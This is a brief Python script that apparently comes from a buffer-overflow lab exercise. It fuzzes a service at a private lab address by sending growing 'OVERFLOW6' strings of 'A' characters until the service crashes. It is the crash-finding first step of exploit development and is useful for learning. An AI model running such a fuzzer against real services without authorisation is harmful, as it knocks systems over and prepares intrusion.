#!/usr/bin/env python3

import sys, socket # time
from time import sleep

ip = "10.10.24.147"

port = 1337
timeout = 5
prefix = "OVERFLOW6 " # COMMAND + some necessary padding strings

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1")) # Alternativly s.send((string.encode()))  Or overflow = b" in front of every lines
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)

  '''
  Continue sending buffer as long as there is conncetion
  Below 2 lines can acutally move up inside to try with block
  '''
  string += 100 * "A"
  # time.sleep(1) 1 second
  sleep(1)
  